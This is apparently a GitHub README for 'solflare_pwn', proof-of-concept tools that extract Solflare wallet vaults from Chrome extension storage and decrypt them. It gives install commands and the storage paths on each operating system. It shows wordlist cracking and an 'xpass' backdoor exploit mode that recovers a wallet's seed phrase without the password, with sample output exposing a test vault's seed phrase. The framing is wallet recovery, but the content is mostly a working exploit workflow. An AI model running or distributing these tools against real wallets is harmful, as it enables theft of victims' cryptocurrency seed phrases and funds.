[![Readme Card](https://github-readme-stats-fast.vercel.app/api/pin/?username=cyclone-github&repo=solflare_pwn&theme=gruvbox)](https://github.com/cyclone-github/solflare_pwn/)

[![GitHub issues](https://img.shields.io/github/issues/cyclone-github/solflare_pwn.svg)](https://github.com/cyclone-github/solflare_pwn/issues)
[![License](https://img.shields.io/github/license/cyclone-github/solflare_pwn.svg)](LICENSE)
[![GitHub release](https://img.shields.io/github/release/cyclone-github/solflare_pwn.svg)](https://github.com/cyclone-github/solflare_pwn/releases)

# Solflare Vault Extractor & Decryptor

## Read here for more info about the "xpass" vulnerability discovered by cyclone which allows Solflare wallets to be decrypted without the wallet password using the xpass backdoor master key: https://forum.hashpwn.net/post/416

### POC tools to recover, extract and decrypt Solflare Vaults
_**This toolset is proudly the first to announce support for Recovering Solflare Wallets**_
- `Do not plagiarize or sell any content in this repo as that is a violation of the GPL v2.0 License`
- Contact me at https://forum.hashpwn.net/user/cyclone if you need help recovering your Solflare wallet password or seed phrase. 

### Install solflare_extractor:
```
go install github.com/cyclone-github/solflare_pwn/solflare_extractor@main
```
### Install solflare_decryptor:
```
go install github.com/cyclone-github/solflare_pwn/solflare_decryptor@main
```

### Solflare Vault location for Chrome extensions:
- Linux: `/home/$USER/.config/google-chrome/Default/Local\ Extension\ Settings/bhhhlbepdkbapadjdnnojkbgioiodbic/`
- Mac: `Library>Application Support>Google>Chrome>Default>Local Extension Settings>bhhhlbepdkbapadjdnnojkbgioiodbic`
- Windows: `C:\Users\$USER\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\bhhhlbepdkbapadjdnnojkbgioiodbic\`
### Extractor usage example on test vault: (plaintext is "cyclone")
```
./solflare_extractor.bin bhhhlbepdkbapadjdnnojkbgioiodbic/
 ----------------------------------------------------- 
|        Cyclone's Solflare Vault Hash Extractor       |
|        Use Solflare Vault Decryptor to decrypt       |
|    https://github.com/cyclone-github/solflare_pwn    |
 ----------------------------------------------------- 

Encrypted Solflare Vault:
$solflare$100000$a9ae805aef0936a0b48a77554601b948$b3b0fcbe4a36abfcdad97df8c5c3be4b633eaf4ee53d392f$898a11113f707bf68a056b5e7c0fba8ad83c8b39fa60c2c0d9645191cb65ce39a640b01d7c34fe557f55073b8bb69fe5067d3356bb3c4d54790eb80ecb9efe73dbee12ef28840c5d31c1963e7e0538debc3c48f737ad7a5ec35ed19731eb331d185a684216ad827d07e66bed071defb75fc7b96c3a8eda97f85b736bf5569e067ad97360e09733abb86ea69c5f91bcaab08bcf24ba0dba6a6b6669aa7d8d74fd08606dbf48aca8326009920811b440321fdcfcdf94e7625d50f605aab7500aaa67cf46a01e9741d4722a9ffb206e7e9e7b5e8a1d4882f3139ce0f1553b891c09839bec96aac5b574fed6f92e8d9097a0d48088518e6370f1b650b27aa2b92b24c20eab3b33f156bb50ccccf3b48b9e1ae789b86df7d705b97876575a46ec824c76cd66e9a73ece8193fd2b09ce8a1995f08614b746613df4fbfa330826d2aedc8d2129fd4ef6fdfae54f358de6e9e556370f05aeb91158f5b0e0db720b77f0d18429c7f3fcff972dbe090cfbfb3ade2f409cd4155b044140ffdae319ebf4b3b7bda4a01ff6ef857aa69c3a71c0ba5891b2f1a6b054b13b031baa38124c79ccf0d72a3318066c338175a3d6af402792415cf3a715a1cbb0f3cda8be736eb2fd0f55453a7889a14c6fa967a86c0b65ec613029bd6df037d962364317851010da8be0bee9e49567f970953052e4fd599efc99ef5f63248912cd7bf70d2d594a193ef02bed2eac4a5ad3115491ae00b75a6816ed974a15776d7ec941c211df3f9a649d81a3b509920ac75f4ddcf668026d1ee4ef6b46eee0badb31a70e8d90293a3903497e68c22c99dd194d8b4309d765c2302c222102e0bf261fda1c7f9c3ea9$d899e2192ab65116a19de312ed578d5d943ca5c46f68ba92be14807f931469688c67bb9e5812fdb3953599f13a0703e2ee9ba3849e358d74d91a6d61e0d0d454be17
```
### Decryptor usage example:
```
 ----------------------------------------------- 
|       Cyclone's Solflare Vault Decryptor       |
| https://github.com/cyclone-github/solflare_pwn |
 ----------------------------------------------- 

Vault file:     hash.txt
Valid Vaults:   1
CPU Threads:    16
Wordlist:       wordlist.txt
2025/02/12 11:52:20 Working...
Hash: $solflare$100000$a9ae805aef0936a0b48a77554601b948$b3b0fcbe4a36abfcdad97df8c5c3be4b633eaf4ee53d392f$898a11113f707bf68a056b5e7c0fba8ad83c8b39fa60c2c0d9645191cb65ce39a640b01d7c34fe557f55073b8bb69fe5067d3356bb3c4d54790eb80ecb9efe73dbee12ef28840c5d31c1963e7e0538debc3c48f737ad7a5ec35ed19731eb331d185a684216ad827d07e66bed071defb75fc7b96c3a8eda97f85b736bf5569e067ad97360e09733abb86ea69c5f91bcaab08bcf24ba0dba6a6b6669aa7d8d74fd08606dbf48aca8326009920811b440321fdcfcdf94e7625d50f605aab7500aaa67cf46a01e9741d4722a9ffb206e7e9e7b5e8a1d4882f3139ce0f1553b891c09839bec96aac5b574fed6f92e8d9097a0d48088518e6370f1b650b27aa2b92b24c20eab3b33f156bb50ccccf3b48b9e1ae789b86df7d705b97876575a46ec824c76cd66e9a73ece8193fd2b09ce8a1995f08614b746613df4fbfa330826d2aedc8d2129fd4ef6fdfae54f358de6e9e556370f05aeb91158f5b0e0db720b77f0d18429c7f3fcff972dbe090cfbfb3ade2f409cd4155b044140ffdae319ebf4b3b7bda4a01ff6ef857aa69c3a71c0ba5891b2f1a6b054b13b031baa38124c79ccf0d72a3318066c338175a3d6af402792415cf3a715a1cbb0f3cda8be736eb2fd0f55453a7889a14c6fa967a86c0b65ec613029bd6df037d962364317851010da8be0bee9e49567f970953052e4fd599efc99ef5f63248912cd7bf70d2d594a193ef02bed2eac4a5ad3115491ae00b75a6816ed974a15776d7ec941c211df3f9a649d81a3b509920ac75f4ddcf668026d1ee4ef6b46eee0badb31a70e8d90293a3903497e68c22c99dd194d8b4309d765c2302c222102e0bf261fda1c7f9c3ea9
Password: cyclone
Seed Phrase: daring rose clump noble element fork differ inform gravity turtle oven iron
2025/02/12 11:52:35 Decrypted: 1/1 718.31 h/s 00h:00m:15s

2025/02/12 11:52:35 Finished
```
### xpass exploit mode
When the extractor finds the `solflarexpass` key in the extension storage, the hash output includes a trailing `$hex` segment. Use the `-x` flag to decrypt without a wordlist:

```
./solflare_decryptor.bin -h hash.txt -x
```

**Note:** Cannot use `-x` and `-w` together. 

### Decryptor exploit usage example:
```
 ----------------------------------------------- 
|       Cyclone's Solflare Vault Decryptor       |
| https://github.com/cyclone-github/solflare_pwn |
 ----------------------------------------------- 

Vault file:     hash.txt
Valid Vaults:   1
CPU Threads:    16
Mode:           xpass exploit
2025/02/12 11:44:37 Working...
Hash: $solflare$100000$a9ae805aef0936a0b48a77554601b948$b3b0fcbe4a36abfcdad97df8c5c3be4b633eaf4ee53d392f$898a11113f707bf68a056b5e7c0fba8ad83c8b39fa60c2c0d9645191cb65ce39a640b01d7c34fe557f55073b8bb69fe5067d3356bb3c4d54790eb80ecb9efe73dbee12ef28840c5d31c1963e7e0538debc3c48f737ad7a5ec35ed19731eb331d185a684216ad827d07e66bed071defb75fc7b96c3a8eda97f85b736bf5569e067ad97360e09733abb86ea69c5f91bcaab08bcf24ba0dba6a6b6669aa7d8d74fd08606dbf48aca8326009920811b440321fdcfcdf94e7625d50f605aab7500aaa67cf46a01e9741d4722a9ffb206e7e9e7b5e8a1d4882f3139ce0f1553b891c09839bec96aac5b574fed6f92e8d9097a0d48088518e6370f1b650b27aa2b92b24c20eab3b33f156bb50ccccf3b48b9e1ae789b86df7d705b97876575a46ec824c76cd66e9a73ece8193fd2b09ce8a1995f08614b746613df4fbfa330826d2aedc8d2129fd4ef6fdfae54f358de6e9e556370f05aeb91158f5b0e0db720b77f0d18429c7f3fcff972dbe090cfbfb3ade2f409cd4155b044140ffdae319ebf4b3b7bda4a01ff6ef857aa69c3a71c0ba5891b2f1a6b054b13b031baa38124c79ccf0d72a3318066c338175a3d6af402792415cf3a715a1cbb0f3cda8be736eb2fd0f55453a7889a14c6fa967a86c0b65ec613029bd6df037d962364317851010da8be0bee9e49567f970953052e4fd599efc99ef5f63248912cd7bf70d2d594a193ef02bed2eac4a5ad3115491ae00b75a6816ed974a15776d7ec941c211df3f9a649d81a3b509920ac75f4ddcf668026d1ee4ef6b46eee0badb31a70e8d90293a3903497e68c22c99dd194d8b4309d765c2302c222102e0bf261fda1c7f9c3ea9$d899e2192ab65116a19de312ed578d5d943ca5c46f68ba92be14807f931469688c67bb9e5812fdb3953599f13a0703e2ee9ba3849e358d74d91a6d61e0d0d454be17
Password: No password needed, see https://forum.hashpwn.net/post/416
Seed Phrase: daring rose clump noble element fork differ inform gravity turtle oven iron
2025/02/12 11:44:37 Finished
2025/02/12 11:44:37 Decrypted: 1/1 62.09 h/s 00h:00m:00s
```

### Decryptor supported options:
```
-w {wordlist} (omit -w to read from stdin)
-h {solflare_wallet_hash}
-x              xpass exploit mode (decrypt without password when vulnerable; cannot use with -w)
-o {output} (omit -o to write to stdout)
-t {cpu threads}
-s {print status every nth sec}

-version (version info)
-help (usage instructions)

Wordlist mode:
./solflare_decryptor.bin -h {solflare_wallet_hash} -w {wordlist} -o {output} -t {cpu threads} -s {print status every nth sec}

./solflare_decryptor.bin -h solflare.txt -w wordlist.txt -o cracked.txt -t 16 -s 10

cat wordlist | ./solflare_decryptor.bin -h solflare.txt

xpass exploit mode (using the backdoor xpass master key):
./solflare_decryptor.bin -h solflare.txt -x
```